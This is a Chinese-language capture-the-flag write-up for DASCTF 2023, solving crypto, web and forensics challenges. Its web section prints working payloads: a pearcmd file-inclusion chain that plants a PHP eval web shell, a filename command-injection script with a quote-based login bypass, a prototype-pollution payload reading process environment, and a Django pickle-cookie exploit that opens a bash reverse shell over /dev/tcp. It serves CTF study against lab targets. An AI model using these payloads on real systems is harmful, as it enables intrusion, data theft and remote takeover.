# dasctf2023


[https://mp.weixin.qq.com/s/4PdBJvd7mhzqjW1TEL6eyQ](https://mp.weixin.qq.com/s/4PdBJvd7mhzqjW1TEL6eyQ)

## Crypto
### ezDHKE
DH秘钥交换算法
```javascript
from Crypto.Util.number import *
from Crypto.Cipher import AES
from hashlib import sha256
from random import randbytes, getrandbits
from flag import flag
def diffie_hellman(g, p, flag):
    alice = getrandbits(1024)
    bob = getrandbits(1024)
    alice_c = pow(g, alice, p)
    bob_c = pow(g, bob, p)
    print(alice_c , bob_c)
    key = sha256(long_to_bytes(pow(bob_c, alice, p))).digest()
    iv = b"dasctfdasctfdasc"
    aes = AES.new(key, AES.MODE_CBC, iv)
    enc = aes.encrypt(flag)
    print(enc)

def getp():
    p = int(input("P = "))
    assert isPrime(p)
    assert p.bit_length() >= 1024 and p.bit_length() <= 2048
    g = 2
    diffie_hellman(g, p, flag)

getp()
```
用sympy爆破得到alice，接着直接算出key，aes解密
```javascript
from Crypto.Util.number import *
from Crypto.Cipher import AES
from hashlib import sha256
from random import randbytes, getrandbits
import sympy

g = 2
# 发送的值
p = 176473303538524259200554324953336384726672109110665668162293282699973540848874702767584458062843333942678732811932897476909679289489853667242704250498709920215500564359945126566451281262283662096646326724094693217360879121741192532765498098061185923631716696944607478088126741032221004102364580340388512170139

# 接受的值
alice_c = 116422458936138223943069329151449628620887411227326141612352468878514291972797654824374121477146198214342663499366635720814832868575111011304893177647525324938970364205738697942060870356858539780215862304076739069966427761162733238983307766865440156707986581436372514526662007282745452506027379870884349341314
bob_c = 4111598058582345051511433116087544739730149383414507753197881367689686351154945337172273139447430580308975332887065025804912036576797851108794117352109240960122760753358651469653955974319069389954034952709742101468664887276795630238745730073479579114131391438941350835658265269375188171025592267891208618467
enc = b'\xb3\x948\xfc\xfc.~\x19\xed\xd7p\x11\x18\x1e\x14\x0f\x9e\xae\xc6\xb1Vh\xb0s\xb0\x98g\xea\x87\xf0\xc6\xd1B\x03\x14\x07\x85`i)\x12i\x858\xe2\x9f\x98\x01'

alice = sympy.ntheory.discrete_log(p, alice_c, g)
print("alice: ", alice)

key = sha256(long_to_bytes(pow(bob_c, alice, p))).digest()
print("key: ", key)

iv = b"dasctfdasctfdasc"
aes = AES.new(key, AES.MODE_CBC, iv)
flag = aes.decrypt(enc)
print("flag: ", flag)
```
### ezRSA
[https://www.cnblogs.com/Cryglz/p/17456832.html](https://www.cnblogs.com/Cryglz/p/17456832.html)
[https://www.cnblogs.com/ZimaBlue/articles/17484824.html](https://www.cnblogs.com/ZimaBlue/articles/17484824.html)
[https://jsur.in/posts/2020-05-13-sharkyctf-2020-writeups#noisy-rsa](https://jsur.in/posts/2020-05-13-sharkyctf-2020-writeups#noisy-rsa)
### ezAlgebra
对第一个等式展开在环n上得到t的四次方程，可求解t，然后gcd一下分解出一个p。
对第二，第三个等式在环q*r上求groebner基，得到m，M=m%q,然后小规模爆破还原M
## WEB
### ez_cms
pearcmd.php包含 rce
/admin，弱密码admin，123456
payload：
```
/?+config-create+/&r=../../../../usr/share/php/pearcmd&/<?=eval($_GET[1]);?>+/tmp/hello.php

/admin?r=../../../../../tmp/hello&1=system("ls");
```
![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1690010441609-eb962b83-11c1-4334-a573-4288e759435a.png#averageHue=%23f4f3f2&clientId=u3293cff2-3606-4&from=paste&id=u4e20a595&originHeight=687&originWidth=1280&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u52f6710d-e1ac-494a-a95c-10efd08086c&title=)
![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1690010441601-0513b4d8-bed4-45eb-9d1c-d25cda17ddc4.png#averageHue=%23666461&clientId=u3293cff2-3606-4&from=paste&id=uc93f670c&originHeight=687&originWidth=1291&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u7980c83b-f04a-4a23-a699-146a7ddfec6&title=)
![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1690010441602-78b7d622-029a-476d-afd3-4e914b904b9c.png#averageHue=%23676563&clientId=u3293cff2-3606-4&from=paste&id=ua94b2374&originHeight=687&originWidth=1291&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u93e933ee-63c2-4b5d-868f-3f0dcf269ce&title=)
### MyPicDisk
反引号执行命令；base64编码绕过
/y0u_cant_find_1t.zip，查看源码
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1690859133317-0625ac67-f133-4993-b762-78718bf99b4d.png#averageHue=%23292d37&clientId=u786887c5-3901-4&from=paste&height=302&id=u19288c66&originHeight=302&originWidth=777&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29258&status=done&style=none&taskId=u4cc61da5-ff3b-451c-bc0c-51e688ee1aa&title=&width=777)
（为什么admin'能绕过
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1690859168112-9e83ab3a-188a-4818-971f-b11ccc0e9769.png#averageHue=%23282d36&clientId=u786887c5-3901-4&from=paste&height=691&id=ud2e6e1bd&originHeight=691&originWidth=1143&originalType=binary&ratio=1&rotation=0&showTitle=false&size=57640&status=done&style=none&taskId=ubeb70aed-cc85-416c-8e5d-5d041ed20f7&title=&width=1143)
文件名用命令拼接，先上传再访问
payload：
```javascript
import base64
import requests

url = "http://c0613360-527a-49fb-8936-952d331ee12b.node4.buuoj.cn:81/"

data = {
    "username":"admin'",
    "password":"admin",
    "submit":"mof"
}
headers = {
    "Cookie":"PHPSESSID=080f5551eb5516a632c2e85ad8835f3e"
}

payload="ls /"
# payload="cat /adj*"
payload=";`echo {}|base64 -d`;.jpg".format(base64.b64encode(payload.encode()).decode())
files_data={'file':(payload, 'image/png')}

requests.post(url, data=data, headers=headers)
requests.post(url, headers=headers, files=files_data)
requests.post(url, data=data, headers=headers)
res=requests.post(url+"?file="+payload, data=data, headers=headers)
print(res.text)
```
### EzFlask
python原型链污染 [https://tttang.com/archive/1876/](https://tttang.com/archive/1876/)
过滤了__init__，Unicode编码绕过
payload：
```json
{"username":"mof","password":"mof","\u0000\u005f\u0000\u005f\u0000\u0069\u0000\u006e\u0000\u0069\u0000\u0074\u0000\u005f\u0000\u005f":{"__globals__": {"__file__":"/proc/1/environ"}}}
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1690018621749-cdad5f48-5feb-4041-bfe8-32a92703fb7c.png#averageHue=%23f5f4f4&clientId=ube290e2a-5937-4&from=paste&height=687&id=u5b42a0c6&originHeight=687&originWidth=1280&originalType=binary&ratio=1&rotation=0&showTitle=false&size=94820&status=done&style=none&taskId=u98ae6f50-7d4c-4046-bfd7-517dd464862&title=&width=1280)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1690018591377-45ffee6a-1df8-4961-a4d0-c94edaa13d0f.png#averageHue=%236a6968&clientId=ube290e2a-5937-4&from=paste&height=687&id=u57488aea&originHeight=687&originWidth=1291&originalType=binary&ratio=1&rotation=0&showTitle=false&size=127074&status=done&style=none&taskId=u69ad0b04-8501-4379-a0fb-78352749deb&title=&width=1291)
### ez_py
sessioin pickle反序列化
[https://boogipop.com/2023/07/22/DASCTF%202023%20&%200X401%20Web%20WriteUp/#ez-py](https://boogipop.com/2023/07/22/DASCTF%202023%20&%200X401%20Web%20WriteUp/#ez-py)
settings.py
```
"""
Django settings for openlug project.

Generated by 'django-admin startproject' using Django 2.2.5.

For more information on this file, see
https://docs.djangoproject.com/en/2.2/topics/settings/

For the full list of settings and their values, see
https://docs.djangoproject.com/en/2.2/ref/settings/
"""

import os

# Build paths inside the project like this: os.path.join(BASE_DIR, ...)
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


# Quick-start development settings - unsuitable for production
# See https://docs.djangoproject.com/en/2.2/howto/deployment/checklist/

# SECURITY WARNING: keep the secret key used in production non-secret!
SECRET_KEY = 'p(^*@36nw13xtb23vu%x)2wp-vk)ggje^sobx+*w2zd^ae8qnn'

# SECURITY WARNING: don't run with debug turned on in production!
DEBUG = False

ALLOWED_HOSTS = ["*"]


# Application definition

INSTALLED_APPS = [
    # 'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'app'
]

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    # we're going to be RESTful in the future,
    # to prevent inconvenience, just turn csrf off.
    # 'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]

ROOT_URLCONF = 'openlug.urls'
# for database performance
SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies'
# use PickleSerializer
SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'

TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]

WSGI_APPLICATION = 'openlug.wsgi.application'


# Database
# https://docs.djangoproject.com/en/2.2/ref/settings/#databases

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': os.path.join(BASE_DIR, 'db.sqlite3'),
    }
}


# Password validation
# https://docs.djangoproject.com/en/2.2/ref/settings/#auth-password-validators

AUTH_PASSWORD_VALIDATORS = [
    {
        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',
    },
]


# Internationalization
# https://docs.djangoproject.com/en/2.2/topics/i18n/

LANGUAGE_CODE = 'zh-Hans'

TIME_ZONE = 'Asia/Shanghai'

USE_I18N = True

USE_L10N = True

USE_TZ = True


# Static files (CSS, JavaScript, Images)
# https://docs.djangoproject.com/en/2.2/howto/static-files/

STATIC_URL = '/static/'

LOGIN_URL = '/'
```
采用PickleSerializer
```python
class PickleSerializer:
    """
    Simple wrapper around pickle to be used in signing.dumps()/loads() and
    cache backends.
    """

    def __init__(self, protocol=None):
        warnings.warn(
            "PickleSerializer is deprecated due to its security risk. Use "
            "JSONSerializer instead.",
            RemovedInDjango50Warning,
        )
        self.protocol = pickle.HIGHEST_PROTOCOL if protocol is None else protocol

    def dumps(self, obj):
        return pickle.dumps(obj, self.protocol)

    def loads(self, data):
        return pickle.loads(data)
```
payload：
```python
from django.http import HttpResponse
import django.core.signing
import pickle
import subprocess

class PickleSerializer(object):
    def dumps(self, obj):
        return pickle.dumps(obj)

    def loads(self, data):
        return pickle.loads(data)


class Command(object):
    def __reduce__(self):
        return (subprocess.Popen, (('bash -c "bash -i >& /dev/tcp/xxx/3000 <&1"',),-1,None,None,None,None,None,False, True))


def exp(self):
    SECRET_KEY = 'p(^*@36nw13xtb23vu%x)2wp-vk)ggje^sobx+*w2zd^ae8qnn'
    salt = "django.contrib.sessions.backends.signed_cookies"
    out_cookie= django.core.signing.dumps(
        Command(), key=SECRET_KEY, salt=salt, serializer=PickleSerializer)
    return HttpResponse(out_cookie)
```
```python
gASVYgAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlCiMNGJhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTE5LjI5LjIwNy4yNy8zMDAwIDwmMSKUhZRK_____05OTk5OiYh0lFKULg:1qQe0Y:JrXwUfbqSYlYlhRUQ6XKt86TyL4
```
在login时抓包，更改session，反弹shell（POST好像不行
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1690852679552-8c85fc14-63b8-46d5-9a54-a70e9f93e2fc.png#averageHue=%23f6f3f3&clientId=uc4ad73ec-5559-4&from=paste&height=285&id=ucc0fd0f3&originHeight=285&originWidth=748&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40766&status=done&style=none&taskId=u5701d639-3914-4f5f-bba4-8ef62fd6b93&title=&width=748)
### ez_timing
HTTP/2；timing
[https://github.com/ConnorNelson/spaceless-spacing](https://github.com/ConnorNelson/spaceless-spacing)
```javascript
-v 可以输出调试信息
curl --http2-prior-knowledge 139.155.99.122:12003
curl --http2-prior-knowledge 139.155.99.122:12003/file
curl --http2-prior-knowledge -I 139.155.99.122:12003/getkey （HEAD请求）
curl --http2-prior-knowledge -X POST 139.155.99.122:12003/getkey （POST请求）
```
需要爆破密钥，使用flask-unsign
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1691054200432-156b7935-003a-48f3-8b10-edb20476cf07.png#averageHue=%23101010&clientId=u6561ac37-4c55-4&from=paste&height=70&id=u027296e8&originHeight=70&originWidth=956&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12641&status=done&style=none&taskId=u9747366a-6540-497c-949d-120a7871043&title=&width=956)
flask-sessioin-cookie-manager3.py伪造cookie
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1691054512859-e935311d-cc3c-41d1-9e73-e79911e2adc8.png#averageHue=%23191919&clientId=u6561ac37-4c55-4&from=paste&height=83&id=uba9723a6&originHeight=83&originWidth=1024&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16960&status=done&style=none&taskId=u46613808-2d78-42f6-bae2-79d30317e05&title=&width=1024)
```javascript

curl --http2-prior-knowledge -H "Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.ZL6kNA.shduF_TuEL8rRpIZMugxe36Ovas;" 139.155
.99.122:12003/file -v
```
源码
```javascript
#!/usr/bin/env python

import time
from flask import Flask, session,request
import os
import random

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(2).hex()

FLAG = os.environ["SECRET"]
assert " " not in FLAG

TINY_TIME = 6.114514 * 10 ** -44


@app.route("/")
def index():
    if not session.get('user'):
        session['user'] = ''.join(random.choices("admin", k=5))
    return 'Hello {}!,cancan /file\n'.format(session['user'])

@app.route('/getkey')
def getkey():
    if request.method != "GET":
        session["key"] = app.config['SECRET_KEY']
    else:
        return "GET is not allowd\n"

@app.route("/file")
def read():
    if session.get('user') != "admin":
        return "User not admin! getkey first!\n"
    else:
        with open(__file__) as f:
            return f.read()

@app.route("/<secret>")
def check_flag(secret):
    if len(secret) != len(FLAG):
        return "WAKUWAKU!"
    for a, b in zip(secret, FLAG):
        if a == " ":
            continue
        elif a != b:
            return "WRONG!"
        else:
            time.sleep(TINY_TIME)
    if " " in secret:
        return "WRONG!"
* Connection #0 to host 139.155.99.122 left intact
    return "CORRECT!"
```
利用[https://github.com/ConnorNelson/spaceless-spacing](https://github.com/ConnorNelson/spaceless-spacing)脚本爆破
## MISC
### ezFAT32
fs.img用010 editor打开
![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1690010472350-51d3015b-d2d6-4c0e-84cd-058ca3ee38f7.png#averageHue=%233d3b36&clientId=u3293cff2-3606-4&from=paste&id=udb92fb7e&originHeight=91&originWidth=633&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u32933a96-91c2-498f-8ecf-408d5022b38&title=)
bmp文件头42 4D，把前面多余的和后面的00去掉，另存为.bmp
[https://www.strerr.com/cn/sha256_file.html ](https://www.strerr.com/cn/sha256_file.html )
算出sha256
解压压缩包，拿到flag
（注意把flag里的dasctf换成flag提交）

